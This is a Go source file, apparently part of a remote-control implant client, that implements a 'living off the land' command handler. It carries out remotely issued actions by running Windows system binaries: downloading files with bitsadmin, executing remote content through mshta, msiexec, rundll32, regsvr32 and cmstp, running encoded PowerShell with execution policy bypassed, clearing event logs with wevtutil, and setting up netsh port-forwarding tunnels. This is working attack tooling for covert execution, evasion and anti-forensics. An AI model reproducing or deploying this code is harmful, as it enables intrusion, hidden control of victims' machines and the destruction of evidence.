//go:build windows

package lotl

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

type LotlManager struct {
	logger Logger
}

type Logger interface {
	Printf(format string, args ...interface{})
}

func NewManager(logger Logger) *LotlManager {
	return &LotlManager{logger: logger}
}

func (m *LotlManager) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	result := protocol.CommandResult{CommandID: cmd.ID, CompletedAt: completedAt}

	var payload LotlCommandPayload
	if err := protocol.UnmarshalPayload(cmd.Payload, &payload); err != nil {
		result.Success = false
		result.Error = fmt.Sprintf("invalid lotl payload: %v", err)
		return result
	}

	action := strings.ToLower(strings.TrimSpace(payload.Action))
	var out string
	var err error

	switch action {
	case "certutil-encode":
		out, err = m.certutilEncode(ctx, payload.Source, payload.Target)
	case "certutil-decode":
		out, err = m.certutilDecode(ctx, payload.Source, payload.Target)
	case "bitsadmin-download":
		out, err = m.bitsadminDownload(ctx, payload.Source, payload.Target)
	case "wevtutil-clear":
		out, err = m.wevtutilClear(ctx, payload.Target) // Target here is log name
	case "netsh-portproxy-add":
		out, err = m.netshPortProxyAdd(ctx, payload.Metadata)
	case "netsh-portproxy-delete":
		out, err = m.netshPortProxyDelete(ctx, payload.Metadata)
	case "sc-control":
		out, err = m.scControl(ctx, payload.Target, payload.Metadata["action"])
	case "taskkill":
		out, err = m.taskkill(ctx, payload.Target, payload.Args)
	case "powershell":
		out, err = m.powershell(ctx, payload.Target, payload.Args, payload.Metadata["encoded"] == "true")
	case "mshta":
		out, err = m.mshta(ctx, payload.Target)
	case "rundll32":
		out, err = m.rundll32(ctx, payload.Target, payload.Metadata["function"], payload.Args)
	case "regsvr32":
		out, err = m.regsvr32(ctx, payload.Target, payload.Metadata["silent"] == "true", payload.Metadata["uninstall"] == "true")
	case "wmic":
		out, err = m.wmic(ctx, payload.Args)
	case "whoami":
		out, err = m.whoami(ctx, payload.Args)
	case "net":
		out, err = m.net(ctx, payload.Args)
	case "msiexec":
		out, err = m.msiexec(ctx, payload.Target, payload.Metadata["silent"] == "true")
	case "cmstp":
		out, err = m.cmstp(ctx, payload.Target, payload.Metadata["silent"] == "true")
	default:
		err = fmt.Errorf("unsupported lotl action: %s", action)
	}

	if err != nil {
		result.Success = false
		result.Error = err.Error()
		if out != "" {
			result.Output = out
		}
		return result
	}

	result.Success = true
	result.Output = out
	return result
}

func (m *LotlManager) certutilEncode(ctx context.Context, src, dst string) (string, error) {
	if src == "" || dst == "" {
		return "", fmt.Errorf("source and destination required")
	}
	cmd := exec.CommandContext(ctx, "certutil.exe", "-encode", src, dst)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("certutil encode failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) certutilDecode(ctx context.Context, src, dst string) (string, error) {
	if src == "" || dst == "" {
		return "", fmt.Errorf("source and destination required")
	}
	cmd := exec.CommandContext(ctx, "certutil.exe", "-decode", src, dst)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("certutil decode failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) bitsadminDownload(ctx context.Context, url, dst string) (string, error) {
	if url == "" || dst == "" {
		return "", fmt.Errorf("url and destination required")
	}
	// bitsadmin /transfer myDownloadJob /download /priority normal http://example.com/file.zip C:\path\to\file.zip
	jobName := fmt.Sprintf("job-%d", time.Now().Unix())
	cmd := exec.CommandContext(ctx, "bitsadmin.exe", "/transfer", jobName, "/download", "/priority", "normal", url, dst)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("bitsadmin download failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) wevtutilClear(ctx context.Context, logName string) (string, error) {
	if logName == "" {
		logName = "System"
	}
	cmd := exec.CommandContext(ctx, "wevtutil.exe", "cl", logName)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("wevtutil clear failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) netshPortProxyAdd(ctx context.Context, meta map[string]string) (string, error) {
	listenPort := meta["listenport"]
	listenAddr := meta["listenaddress"]
	connectPort := meta["connectport"]
	connectAddr := meta["connectaddress"]

	if listenPort == "" || connectPort == "" || connectAddr == "" {
		return "", fmt.Errorf("listenport, connectport, and connectaddress are required")
	}
	if listenAddr == "" {
		listenAddr = "0.0.0.0"
	}

	cmd := exec.CommandContext(ctx, "netsh.exe", "interface", "portproxy", "add", "v4tov4",
		"listenport="+listenPort, "listenaddress="+listenAddr,
		"connectport="+connectPort, "connectaddress="+connectAddr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("netsh add portproxy failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) netshPortProxyDelete(ctx context.Context, meta map[string]string) (string, error) {
	listenPort := meta["listenport"]
	listenAddr := meta["listenaddress"]

	if listenPort == "" {
		return "", fmt.Errorf("listenport is required")
	}
	if listenAddr == "" {
		listenAddr = "0.0.0.0"
	}

	cmd := exec.CommandContext(ctx, "netsh.exe", "interface", "portproxy", "delete", "v4tov4",
		"listenport="+listenPort, "listenaddress="+listenAddr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("netsh delete portproxy failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) scControl(ctx context.Context, serviceName, action string) (string, error) {
	if serviceName == "" || action == "" {
		return "", fmt.Errorf("service name and action are required")
	}

	validActions := map[string]bool{
		"query":    true,
		"start":    true,
		"stop":     true,
		"pause":    true,
		"continue": true,
		"config":   true,
		"description": true,
	}

	if !validActions[strings.ToLower(action)] {
		return "", fmt.Errorf("invalid sc action: %s", action)
	}

	cmd := exec.CommandContext(ctx, "sc.exe", action, serviceName)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("sc %s %s failed: %w", action, serviceName, err)
	}
	return string(out), nil
}

func (m *LotlManager) taskkill(ctx context.Context, target string, args []string) (string, error) {
	if target == "" {
		return "", fmt.Errorf("target (PID or image name) is required")
	}

	execArgs := []string{"/F"}
	if _, err := fmt.Sscanf(target, "%d", new(int)); err == nil {
		execArgs = append(execArgs, "/PID", target)
	} else {
		execArgs = append(execArgs, "/IM", target)
	}

	for _, arg := range args {
		if strings.EqualFold(arg, "/T") {
			execArgs = append(execArgs, "/T")
		}
	}

	cmd := exec.CommandContext(ctx, "taskkill.exe", execArgs...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("taskkill failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) powershell(ctx context.Context, command string, args []string, encoded bool) (string, error) {
	if command == "" {
		return "", fmt.Errorf("command is required")
	}

	execArgs := []string{"-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass"}
	if encoded {
		execArgs = append(execArgs, "-EncodedCommand", command)
	} else {
		execArgs = append(execArgs, "-Command", command)
	}
	execArgs = append(execArgs, args...)

	cmd := exec.CommandContext(ctx, "powershell.exe", execArgs...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("powershell failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) mshta(ctx context.Context, target string) (string, error) {
	if target == "" {
		return "", fmt.Errorf("target (URL or path) is required")
	}

	cmd := exec.CommandContext(ctx, "mshta.exe", target)
	// mshta usually doesn't return output to stdout, and might hang if it opens a window.
	// We might want to run it in a way that doesn't block forever if it's an interactive HTA.
	// For LOTL purposes, it's often used to execute vbscript/jscript.
	err := cmd.Start()
	if err != nil {
		return "", fmt.Errorf("mshta failed to start: %w", err)
	}

	// We'll wait a bit but not forever? Or just let it run.
	// Given this is a command handler, we should probably wait for it if we want to know if it worked.
	// But mshta is tricky. Let's just wait and see.
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case <-ctx.Done():
		return "", ctx.Err()
	case err := <-done:
		if err != nil {
			return "", fmt.Errorf("mshta failed: %w", err)
		}
	case <-time.After(5 * time.Second):
		// Assume it started successfully if it didn't exit immediately with error
		return "mshta started and still running (or detached)", nil
	}

	return "mshta executed successfully", nil
}

func (m *LotlManager) rundll32(ctx context.Context, dllPath, function string, args []string) (string, error) {
	if dllPath == "" {
		return "", fmt.Errorf("dll path is required")
	}
	if function == "" {
		function = "DllMain"
	}

	target := fmt.Sprintf("%s,%s", dllPath, function)
	execArgs := append([]string{target}, args...)

	cmd := exec.CommandContext(ctx, "rundll32.exe", execArgs...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("rundll32 failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) regsvr32(ctx context.Context, dllPath string, silent, uninstall bool) (string, error) {
	if dllPath == "" {
		return "", fmt.Errorf("dll path is required")
	}

	execArgs := []string{}
	if silent {
		execArgs = append(execArgs, "/s")
	}
	if uninstall {
		execArgs = append(execArgs, "/u")
	}
	// /n /i:cmdline can also be used
	execArgs = append(execArgs, dllPath)

	cmd := exec.CommandContext(ctx, "regsvr32.exe", execArgs...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("regsvr32 failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) wmic(ctx context.Context, args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("args are required for wmic")
	}

	cmd := exec.CommandContext(ctx, "wmic.exe", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("wmic failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) whoami(ctx context.Context, args []string) (string, error) {
	if len(args) == 0 {
		args = []string{"/all"}
	}

	cmd := exec.CommandContext(ctx, "whoami.exe", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("whoami failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) net(ctx context.Context, args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("args are required for net")
	}

	cmd := exec.CommandContext(ctx, "net.exe", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("net failed: %w", err)
	}
	return string(out), nil
}

func (m *LotlManager) msiexec(ctx context.Context, target string, silent bool) (string, error) {
	if target == "" {
		return "", fmt.Errorf("target (path or URL) is required")
	}

	// msiexec /q /i http://server/package.msi
	// Or for DLL execution: msiexec /y "C:\path\to\your.dll"
	args := []string{"/i", target}
	if silent {
		args = append(args, "/q")
	}

	cmd := exec.CommandContext(ctx, "msiexec.exe", args...)
	err := cmd.Start()
	if err != nil {
		return "", fmt.Errorf("msiexec failed to start: %w", err)
	}

	// msiexec can take a while. We'll wait a bit.
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case <-ctx.Done():
		return "", ctx.Err()
	case err := <-done:
		if err != nil {
			return "", fmt.Errorf("msiexec failed: %w", err)
		}
	case <-time.After(10 * time.Second):
		return "msiexec started and running", nil
	}

	return "msiexec executed successfully", nil
}

func (m *LotlManager) cmstp(ctx context.Context, infPath string, silent bool) (string, error) {
	if infPath == "" {
		return "", fmt.Errorf("INF path is required")
	}

	// cmstp.exe /ni /s "C:\path\to\payload.inf"
	args := []string{"/ni"}
	if silent {
		args = append(args, "/s")
	}
	args = append(args, infPath)

	cmd := exec.CommandContext(ctx, "cmstp.exe", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("cmstp failed: %w", err)
	}
	return string(out), nil
}
